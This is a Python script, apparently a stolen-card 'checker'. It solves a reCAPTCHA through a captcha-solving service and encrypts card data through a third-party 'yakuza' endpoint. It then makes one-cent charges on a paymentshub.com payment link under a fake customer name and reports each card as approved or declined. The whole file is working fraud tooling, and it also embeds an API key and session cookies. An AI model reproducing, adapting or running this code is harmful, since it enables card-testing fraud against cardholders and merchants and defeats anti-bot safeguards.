import requests
import capsolver
import asyncio
from httpx import AsyncClient
from faker import Faker



async def checkout1(cc,mes,ano,cvv,proxyg):
    async with AsyncClient(verify=False,proxy=proxyg) as web:
        capsolver.api_key = "CAP-7FDEBEE009A2807063AFDF5FCE50B716"
        fake = Faker()           
        g_response = (await asyncio.to_thread(lambda: capsolver.solve({
        "type": "ReCaptchaV3TaskProxyLess",
        "websiteKey": '6LcHHVooAAAAAAkut6aeUc_2YfysbDW8tisYv_cE',
        "websiteURL": 'https://www.paymentshub.com/',
        })))['gRecaptchaResponse']

        headers = {
            'Content-Type': 'application/json',
            'apisites': 'FREEXXXX1-SERVER-[0x10][0xf]'
        }

        json = {
            "pk": "-----BEGIN PUBLIC KEY-----\nMIIEIjANBgkqhkiG9w0BAQEFAAOCBA8AMIIECgKCBAEAzwcTNk6y0pnwN1lryw03\nU2swC2a+z49vLRKeKXnVGczHt7lp2PbbVJ9H2aN4H/4FhB5cEnW1K1D7PmbJU4GH\nzQWbRwkx77I5eW1rTda0UA2os2VJPIaiPGVfQqe0dozRwaHKvUN3658vtUfTj9O+\nG0/NBMm44mMbskGRolNtorFvZakVubmGVzh6sRGzDeZ6fjs3UEFdluYEL3TMPFE2\nKaujPxrCL6bqKPJfhBQbCQSrNWVBcFhWrma2MQSv9bxrVD0UAmgIRj+8NOQfiJHi\nw2E28fX4fL7Jfg2oiLORScJVARfnNN8X9+BIYvDFfMUKoELgORuUKYfOtHwGZGTD\ne2dQAu5McfYxuotJ5qd3ljQthuZS4Bc3dgBiqgp/lFOcua7oxXwNvYkA/N+EMaXB\nlARUO6apQnLkNTCHRL5gTS3FiN6vqHtzVjTDbhISyz6B7S/e1npSGiLT5Cfv29lu\njdK/Y/CEj9iYoi9gKHmg5c7WRFb6guNCSwC6tb+drrdSB6Q59X2tgPhWNvsg8H5t\n6UApkjcDgtmrrZouE1ETEVGxtjtZN30rA4MWJ5WS3upXhV3TF6jkfczlnhCeKHLd\nVLDwoxLCSr8erF11iZnHIpGnZIBJsNoMoRb+n0FUcUzdc1B5EdP/xBDDhVxNy5nN\niat0b5VTkyBDBKgJjUeB7Y6+LAahzfqFFGtT3qifMaFuKbJKFJ+ssT6YYiROiatJ\nIPqtBFtch0EfRVn4A2k3SC7OOBRswKjNZuZhJPoLPoSs8EjSeLMbfaMgLMYG03Ma\n5Cew2YxAu0/H4K/zmS7VrxTEdsSQcFkf31rC+jcmDOWJ0dBYYzrSac3Lz/aFksRK\njEr/gK8eh0oDnn1e/I37Bt3ZLko2u5Th1yC2Ksyc9Cv9yGeI32/exlkD1ivBtk8O\nzthwGJ4NCQWHNPqHlKSo/iYIoWdzmMJa0l3N8Fdu3xID/jLGQNV9AON3dPK/o7aL\nBBlXu//PeILvjgOIUrdVKl8osjStUtKALQoDERHWIixVUQJdOvX9OD5aKWXV9JCt\nAQhSnBEc4jiE/Ge/gkCGt60T5hOXUa0HYuJwZeNMd9Zc4nqEuQPfb8bu9sJf39fd\nbvjfHJk1KtlSSXzxQpZJ1P5SywVSTZRsmXv5BypNkWzIYWqlhyoSGNTd9sd9e8Uj\nYGUOaoxYyuHSm5BS+hAt7Pee7rWiyzVTJgtybL2wZzeMKnX9sbJMb/Foivr/W0T5\npIt5j81USXFlnEQbThAsTQVU4RZX1kqxugNBwCnIGbYqQaOSaIuj98wrIsLC7x3m\n6QyL7pX++wF53esDi2vevTmb5Wa5LvUiiKtyG6OY7eqKlC1a0zLV32kps5AhXXrL\nMwIDAQAB\n-----END PUBLIC KEY-----\n",
            "data": {
                "card": {
                    "name_on_card": "Jack Santana",
                    "number": cc,
                    "exp_month": mes,
                    "exp_year": ano,
                    "cvv": '',
                    "input_type": "KEYED"
                },
                "customer": {
                    "first_name": "Jack",
                    "last_name": "Santana",
                    "email": "srosp1@gmail.com",
                    "phone": "2059482349"
                },
                "custom_field": {
                    "name": "Patient Name",
                    "value": "Gae"
                },
                "id": 1277,
                "type": "payment_link",
                "tax_rate": 0,
                "tax_amount": 0,
                "tip_amount": 0,
                "service_fee_amount": 0,
                "total_amount": 0.01,
                "sub_total_amount": 0.01,
                "transaction_source": "PH-Portal|7.0.2",
                "latitude": None,
                "longitude": None,
                "recaptchaToken": g_response,
            }
        }
        base_url = "https://yakuza.sh-ykza-env.com"
        endpoint = "/encrypt/pp-hub"
        url = base_url + endpoint

        encrypt = await web.post(url, headers=headers, json=json)
        encryptedpayload = encrypt.json()['response']['encodePayload']


        headers = {
            'accept': 'application/json',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            # 'cookie': '_gcl_au=1.1.1503733516.1734669715; _fbp=fb.1.1734669715182.57184610266426327; hubspotutk=dcee67385b18a8723c4892f5615a4c52; _ga_NS15BSQLY9=GS1.1.1735849064.1.0.1735849067.0.0.0; _fbc=fb.1.1736530550576.IwY2xjawHuOcRleHRuA2FlbQIxMAABHZaNDAZM3Fwiy0jxjOXDGgWsYfWl1l1l-MytAt0A-N-ggNQur5rKI-qiOQ_aem_w0P588b1Pu5lJTpFiQ9QMw; _hp2_id.3809640892=%7B%22userId%22%3A%228021454417005352%22%2C%22pageviewId%22%3A%22396006513624651%22%2C%22sessionId%22%3A%223247538756876655%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7D; _ga_FQ285VH35S=GS1.1.1737427752.7.1.1737427902.0.0.0; _ga=GA1.1.945523074.1734669715; connect.sid=s%3A3aOvaFyFA03YQuECtzmlBGk4yPX-FTMS.BX0D2EfO8ol5fBoyPWi4Rc7lBr3OUbz%2BaV21Qc24fcA; __hstc=259812373.dcee67385b18a8723c4892f5615a4c52.1735215086448.1737672528643.1737765659139.35; __hssrc=1; _ga_9808J9JPCM=GS1.1.1737765656.41.1.1737765660.0.0.0; __hssc=259812373.3.1737765659139; _vid_t=i39QhYNBhWz0jxyOnXID/A9lZKhRza1D1jJQmTlnnHBYNxUUPqW0d41/YFP0lPKBuJ2mlyYw95sump/u4DM6GayvdGxpyGephJRNgmU=; AWSALB=SxFRgy0UfYMPtygrVqHIXQ43j1r7W4QL0ZGCu8wzHm4UFcoEFbSU3QLWnphVXK8Q4hCvZ3d3mvhPUk0MeCkX5h8UjMKAIBiXZzZc7xXnSeINMWmDKAoHL6SO9AXA; AWSALBCORS=SxFRgy0UfYMPtygrVqHIXQ43j1r7W4QL0ZGCu8wzHm4UFcoEFbSU3QLWnphVXK8Q4hCvZ3d3mvhPUk0MeCkX5h8UjMKAIBiXZzZc7xXnSeINMWmDKAoHL6SO9AXA',
            'origin': 'https://www.paymentshub.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://www.paymentshub.com/payment-link?token=M2JlNmIyZTU4OWRhN2Y4OGM1MmI4NTc0MjgyYzVkY2E6NTM4NmY0Mzk4MmEyOWQ2ODkzY2NjOGNmM2MzMjI2YTY0MDk3YTk3YmZjNjQ1MWVhZWFjM2I5ZTlhMTYwMmZlMzVlNTU3NWE2NmY3Y2YzODUwYTdjYjY1NmQ0MjM1ZDUzNzEyYmEzODE4ZGY3NjdlZWJkZGZmN2NkMjg3NTQyZmI1YTZiMzUzY2Y3MTI5ODA4YmJkZGZmNGM4MDQxOTU1ODFmMDFhZjNiMGM3YjE0NjA3MzA2YmQ0OWU5MmQyNjRiNTI4ZWU1M2VmNDlkY2UzNTNjM2Y2MjNmYWE1M2EzMzZlOTk5MTc5NTVhMjBkZmFhMjc2ODFiNzY3Y2U5MzI0NDIwMzczNzE5MmQzM2M4NGE4Njk3MTgyZDdkOGNkZTBlOGJjMmVkOTRkNWU2MDFmYjE2ODNlZDRhMTBjYWNhMTE2M2JkNzMyZjFmYzhiN2M2MTJmYzMyNmRkODZjNmY0YjhkZmI1MTM0N2I0ODMzZjIyMTA4ZTFkMTg5OWZhZmQw',
            'requestdate': 'Fri, 24 Jan 2025 17:44:11 -07:00',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'x-browser-signature': '68c65442-ee46-4bd6-b58e-50ec6094d3d4',
            'x-csrf-token': '',
            'x-request-id': '7308d94d-b680-4dbe-b708-fac92f469a3d',
            'x-visitor-id': 'dxgH0tGJiWBqDk1pnIq0',
        }

        data = {
            'payload': encryptedpayload,
        }

        req1 = await web.post(
            'https://www.paymentshub.com/api/payment-link/M2JlNmIyZTU4OWRhN2Y4OGM1MmI4NTc0MjgyYzVkY2E6NTM4NmY0Mzk4MmEyOWQ2ODkzY2NjOGNmM2MzMjI2YTY0MDk3YTk3YmZjNjQ1MWVhZWFjM2I5ZTlhMTYwMmZlMzVlNTU3NWE2NmY3Y2YzODUwYTdjYjY1NmQ0MjM1ZDUzNzEyYmEzODE4ZGY3NjdlZWJkZGZmN2NkMjg3NTQyZmI1YTZiMzUzY2Y3MTI5ODA4YmJkZGZmNGM4MDQxOTU1ODFmMDFhZjNiMGM3YjE0NjA3MzA2YmQ0OWU5MmQyNjRiNTI4ZWU1M2VmNDlkY2UzNTNjM2Y2MjNmYWE1M2EzMzZlOTk5MTc5NTVhMjBkZmFhMjc2ODFiNzY3Y2U5MzI0NDIwMzczNzE5MmQzM2M4NGE4Njk3MTgyZDdkOGNkZTBlOGJjMmVkOTRkNWU2MDFmYjE2ODNlZDRhMTBjYWNhMTE2M2JkNzMyZjFmYzhiN2M2MTJmYzMyNmRkODZjNmY0YjhkZmI1MTM0N2I0ODMzZjIyMTA4ZTFkMTg5OWZhZmQw/pay',
            headers=headers,
            data=data,
        )
        print(req1.text)
        if '00 - Approval' in req1.text:
            status = "Approved ✅"
            mensaje = "AVSFail"
        else:
            mensaje = req1.text.split('"status_message":"')[1].split('"')[0]
            if "Insufficient Funds" in mensaje:
                status = "Approved ✅"
            else:
                status = "Declined ❌"
        return status, mensaje
